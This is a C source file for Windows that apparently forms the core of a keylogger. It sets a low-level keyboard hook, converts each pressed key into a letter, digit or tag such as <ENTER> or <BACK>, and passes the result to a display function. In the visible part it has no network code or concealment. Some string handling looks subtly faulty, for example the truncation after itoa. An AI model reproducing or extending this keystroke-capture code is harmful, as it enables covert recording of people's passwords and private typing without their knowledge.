#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "keylog.h"
HHOOK kbdhook;
void showText(LPSTR text);

BOOL isShiftHold() {
    return HIWORD(GetKeyState(VK_LSHIFT)) || HIWORD(GetKeyState(VK_RSHIFT));
}

char* returnLetterCase(DWORD charCode, char * c) // returns null terminated string containing char
{
    c[0] = '\0';

    if(isShiftHold())
        c[0] = (char)charCode;
    else
        c[0] = (char)charCode+32;

    c[1] = '\0';

    return c;
}

char* returnNumberSymbol(DWORD charCode, char * c) // Doesn't return symbol, just key and whether shift was on.
{
    c[0] = '\0';

    if(isShiftHold())
    {
        memcpy(c, "[^", 2);
        c[2] = (char)charCode;
        c[3] = '\0';
    }
    else
    {
        memcpy(c, "[^SH", 4);
        itoa(charCode, &c[4], 10);
        c[5] = '\0';
    }

    return c;
}

char* returnSpecialKey(DWORD charCode, char * c)
{
    c[0] = '\0';

    switch(charCode) //this is going to be really big.
    {
        case 20: //the default will catch these and return their digits if we don't break here.
            break;
        case 160:
            break;
        case 161:
            break;
        case 32:
            memcpy(c, " ", sizeof(" "));
            break;
        case 13:
            memcpy(c, "<ENTER>", sizeof("<ENTER>"));
            break;
        case 8:
            memcpy(c, "<BACK>", sizeof("<BACK>"));
            break;
        default:
            memset(c, 0, 8);
            c[0] = '[';
            c[1] = '^';
            itoa(charCode, &c[2], 10);
    }


    return c;
}


short GetSymbolFromVK(WPARAM wParam)
{
    BYTE btKeyState[256];
    HKL hklLayout = GetKeyboardLayout(0);
    WORD Symbol;
    GetKeyboardState(btKeyState);
    if((ToAsciiEx(wParam, MapVirtualKey(wParam, 0), btKeyState, &Symbol, 0, hklLayout) == 1) &&
                 GetKeyState(VK_CONTROL) >= 0 && GetKeyState(VK_MENU) >= 0)
        return Symbol;
     return -1;
}

LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wp, LPARAM lp)
{
    KBDLLHOOKSTRUCT k = *(KBDLLHOOKSTRUCT *)lp;
    char c[32];

    if(nCode < 0)
        return CallNextHookEx(kbdhook, nCode, wp, lp);

    if(wp == WM_KEYDOWN) {
        if (k.vkCode >= 65 && k.vkCode <= 90) //between 65 and 90 is a letter key
        {
            returnLetterCase(k.vkCode, c); //so send to letter function

            if(c[0] != '\0')
                showText(c);
        }
        else if (k.vkCode >= 48 && k.vkCode <= 57) //between 48 and 57 is a digit key
        {
            returnNumberSymbol(k.vkCode, c); //number symbol function

            if(c[0] != '\0')
                showText(c);
        }
        else
        {
            returnSpecialKey(k.vkCode, c); //other..

            if(c[0] != '\0')
                showText(c);
        }
    }

    return CallNextHookEx(kbdhook, nCode, wp, lp);
}
